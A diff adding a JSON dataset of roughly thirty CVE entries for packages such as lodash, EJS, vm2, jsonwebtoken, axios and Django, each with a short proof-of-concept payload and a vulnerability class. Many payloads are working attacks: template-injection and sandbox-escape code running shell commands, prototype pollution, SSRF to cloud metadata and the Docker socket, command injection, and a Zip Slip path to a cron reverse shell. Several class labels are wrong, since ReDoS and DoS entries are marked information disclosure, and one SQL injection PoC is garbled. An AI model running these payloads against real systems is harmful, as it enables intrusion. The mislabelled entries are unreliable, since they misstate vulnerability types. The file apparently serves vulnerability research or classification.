@@ -1,0 +1,272 @@
+[
+  {
+    "id": "CVE-2023-26136",
+    "description": "tough-cookie Prototype Pollution via cookie parsing allows arbitrary property injection",
+    "cvss_score": 6.5,
+    "cwe": "CWE-1321",
+    "poc_code": "Set-Cookie: __proto__[isAdmin]=true",
+    "affected_products": ["tough-cookie < 4.1.3"],
+    "class": "prototype_pollution"
+  },
+  {
+    "id": "CVE-2022-24999",
+    "description": "Express.js qs module Prototype Pollution via query string parsing",
+    "cvss_score": 7.5,
+    "cwe": "CWE-1321",
+    "poc_code": "GET /?__proto__[polluted]=true",
+    "affected_products": ["qs < 6.10.3", "express < 4.17.3"],
+    "class": "prototype_pollution"
+  },
+  {
+    "id": "CVE-2023-45857",
+    "description": "Axios SSRF via following redirects to internal IPs without validation",
+    "cvss_score": 6.5,
+    "cwe": "CWE-918",
+    "poc_code": "axios.get(user_url) with redirect to http://169.254.169.254/",
+    "affected_products": ["axios < 1.6.0"],
+    "class": "ssrf"
+  },
+  {
+    "id": "CVE-2021-23337",
+    "description": "Lodash template() allows arbitrary code execution via template literals",
+    "cvss_score": 7.2,
+    "cwe": "CWE-94",
+    "poc_code": "_.template('${require(\"child_process\").execSync(\"id\")}')()",
+    "affected_products": ["lodash < 4.17.21"],
+    "class": "ssti"
+  },
+  {
+    "id": "CVE-2023-32681",
+    "description": "Python requests library leaks Proxy-Authorization header to redirect destination",
+    "cvss_score": 6.1,
+    "cwe": "CWE-200",
+    "poc_code": "Redirect from HTTPS to HTTP leaks auth header",
+    "affected_products": ["requests < 2.31.0"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2022-29078",
+    "description": "EJS Server-Side Template Injection via settings object pollution",
+    "cvss_score": 9.8,
+    "cwe": "CWE-94",
+    "poc_code": "?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');s",
+    "affected_products": ["ejs < 3.1.7"],
+    "class": "ssti"
+  },
+  {
+    "id": "CVE-2023-25690",
+    "description": "Apache HTTP Server request splitting via mod_proxy with RewriteRule",
+    "cvss_score": 9.8,
+    "cwe": "CWE-113",
+    "poc_code": "GET /api%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0aGET%20/admin",
+    "affected_products": ["Apache HTTP Server 2.4.0-2.4.55"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-24998",
+    "description": "Apache Commons FileUpload denial of service via crafted upload request",
+    "cvss_score": 7.5,
+    "cwe": "CWE-770",
+    "poc_code": "Upload file with excessive number of parts without content-type header",
+    "affected_products": ["Commons FileUpload < 1.5", "Tomcat", "Spring"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2022-31129",
+    "description": "Moment.js ReDoS in date parsing allows denial of service",
+    "cvss_score": 7.5,
+    "cwe": "CWE-1333",
+    "poc_code": "moment('0'.repeat(500000) + 'x')",
+    "affected_products": ["moment < 2.29.4"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-36665",
+    "description": "Protobuf.js Prototype Pollution via message parsing",
+    "cvss_score": 9.8,
+    "cwe": "CWE-1321",
+    "poc_code": "Send protobuf message with __proto__ field overriding Object prototype",
+    "affected_products": ["protobufjs < 7.2.4"],
+    "class": "prototype_pollution"
+  },
+  {
+    "id": "CVE-2024-29041",
+    "description": "Express.js open redirect via malformed URL with backslash",
+    "cvss_score": 6.1,
+    "cwe": "CWE-601",
+    "poc_code": "res.redirect('/\\\\evil.com') leads to redirect to evil.com",
+    "affected_products": ["express < 4.19.2"],
+    "class": "open_redirect"
+  },
+  {
+    "id": "CVE-2023-26115",
+    "description": "word-wrap ReDoS vulnerability in wrap function",
+    "cvss_score": 7.5,
+    "cwe": "CWE-1333",
+    "poc_code": "wrap('\\t'.repeat(50000), {hard: true})",
+    "affected_products": ["word-wrap < 1.2.4"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2022-36067",
+    "description": "vm2 sandbox escape allows arbitrary host code execution",
+    "cvss_score": 10.0,
+    "cwe": "CWE-913",
+    "poc_code": "const {VM} = require('vm2'); new VM().run('this.constructor.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"id\").toString()')",
+    "affected_products": ["vm2 < 3.9.11"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-26159",
+    "description": "follow-redirects SSRF via URL parsing difference (credentials in URL)",
+    "cvss_score": 7.4,
+    "cwe": "CWE-918",
+    "poc_code": "Follow redirect to http://attacker:password@127.0.0.1/",
+    "affected_products": ["follow-redirects < 1.15.4"],
+    "class": "ssrf"
+  },
+  {
+    "id": "CVE-2022-25912",
+    "description": "simple-git command injection via remote repository URL",
+    "cvss_score": 9.8,
+    "cwe": "CWE-78",
+    "poc_code": "simpleGit().clone('--upload-pack=id /tmp/repo')",
+    "affected_products": ["simple-git < 3.15.0"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2024-28849",
+    "description": "follow-redirects leaks Authorization header on cross-origin redirect",
+    "cvss_score": 6.5,
+    "cwe": "CWE-200",
+    "poc_code": "Redirect from internal API to attacker domain leaks Bearer token",
+    "affected_products": ["follow-redirects < 1.15.6"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-2142",
+    "description": "Django JSONField SQL injection via crafted key lookup",
+    "cvss_score": 9.8,
+    "cwe": "CWE-89",
+    "poc_code": "Model.objects.filter(json_field__\"key\") OR 1=1--\"=value)",
+    "affected_products": ["Django < 4.2.1"],
+    "class": "sqli"
+  },
+  {
+    "id": "CVE-2024-21490",
+    "description": "angular-expressions sandbox escape allows arbitrary code execution",
+    "cvss_score": 9.8,
+    "cwe": "CWE-94",
+    "poc_code": "{{constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
+    "affected_products": ["angular-expressions < 1.1.5"],
+    "class": "ssti"
+  },
+  {
+    "id": "CVE-2023-44270",
+    "description": "PostCSS line break parsing allows stylesheet injection",
+    "cvss_score": 5.3,
+    "cwe": "CWE-74",
+    "poc_code": "Input with \\r allows injection of arbitrary CSS directives",
+    "affected_products": ["postcss < 8.4.31"],
+    "class": "xss"
+  },
+  {
+    "id": "CVE-2022-23529",
+    "description": "jsonwebtoken allows arbitrary code injection via secretOrPublicKey",
+    "cvss_score": 9.8,
+    "cwe": "CWE-94",
+    "poc_code": "jwt.verify(token, {toString: () => {require('child_process').execSync('id')}})",
+    "affected_products": ["jsonwebtoken < 9.0.0"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-36053",
+    "description": "Django ReDoS in EmailValidator/URLValidator regex",
+    "cvss_score": 7.5,
+    "cwe": "CWE-1333",
+    "poc_code": "Validate email with extremely long domain: 'a@' + 'a' * 5000 + '.com'",
+    "affected_products": ["Django < 4.2.3"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-30533",
+    "description": "SheetJS Prototype Pollution via spreadsheet parsing",
+    "cvss_score": 7.8,
+    "cwe": "CWE-1321",
+    "poc_code": "Upload XLSX with cell A1 named '__proto__' containing {isAdmin: true}",
+    "affected_products": ["sheetjs < 0.19.3"],
+    "class": "prototype_pollution"
+  },
+  {
+    "id": "CVE-2023-2251",
+    "description": "yaml npm package allows arbitrary code execution during parsing",
+    "cvss_score": 9.8,
+    "cwe": "CWE-94",
+    "poc_code": "!!js/function 'function(){ return require(\"child_process\").execSync(\"id\") }'",
+    "affected_products": ["yaml < 2.3.0"],
+    "class": "unsafe_deserialization"
+  },
+  {
+    "id": "CVE-2024-27088",
+    "description": "es5-ext ReDoS in string repeat polyfill",
+    "cvss_score": 5.3,
+    "cwe": "CWE-1333",
+    "poc_code": "require('es5-ext/string/#/repeat')('\\x00'.repeat(100000))",
+    "affected_products": ["es5-ext < 0.10.63"],
+    "class": "info_disclosure"
+  },
+  {
+    "id": "CVE-2023-28155",
+    "description": "Request library SSRF via unix socket path in URL",
+    "cvss_score": 6.1,
+    "cwe": "CWE-918",
+    "poc_code": "request('http://unix:/var/run/docker.sock:/containers/json')",
+    "affected_products": ["request (deprecated, all versions)"],
+    "class": "ssrf"
+  },
+  {
+    "id": "CVE-2022-21824",
+    "description": "Node.js prototype pollution via console.table properties",
+    "cvss_score": 8.2,
+    "cwe": "CWE-1321",
+    "poc_code": "console.table([{a:1}], ['__proto__'])",
+    "affected_products": ["Node.js < 12.22.9, < 14.18.3, < 16.13.2"],
+    "class": "prototype_pollution"
+  },
+  {
+    "id": "CVE-2024-22363",
+    "description": "SharpCompress path traversal via ZIP entry names (Zip Slip)",
+    "cvss_score": 7.5,
+    "cwe": "CWE-22",
+    "poc_code": "ZIP with entry named ../../../../etc/cron.d/reverse_shell",
+    "affected_products": ["SharpCompress < 0.36.0"],
+    "class": "path_traversal"
+  },
+  {
+    "id": "CVE-2023-37466",
+    "description": "vm2 complete sandbox escape via exception handling",
+    "cvss_score": 10.0,
+    "cwe": "CWE-913",
+    "poc_code": "async function fn() { const f = (function(){}).constructor('return process')(); f.mainModule.require('child_process').execSync('id') }",
+    "affected_products": ["vm2 (all versions, package deprecated)"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2024-31449",
+    "description": "Redis Lua scripting integer overflow allows heap buffer overflow",
+    "cvss_score": 7.0,
+    "cwe": "CWE-190",
+    "poc_code": "EVAL with crafted Lua script triggering bit.tohex integer overflow",
+    "affected_products": ["Redis < 7.2.6, < 7.4.1"],
+    "class": "command_injection"
+  },
+  {
+    "id": "CVE-2023-29017",
+    "description": "vm2 sandbox escape via Error.prepareStackTrace",
+    "cvss_score": 10.0,
+    "cwe": "CWE-913",
+    "poc_code": "Error.prepareStackTrace = (err, callSites) => { callSites[0].getThis().constructor.constructor('return process')().mainModule.require('child_process').execSync('id') }",
+    "affected_products": ["vm2 < 3.9.15"],
+    "class": "command_injection"
+  }
+]
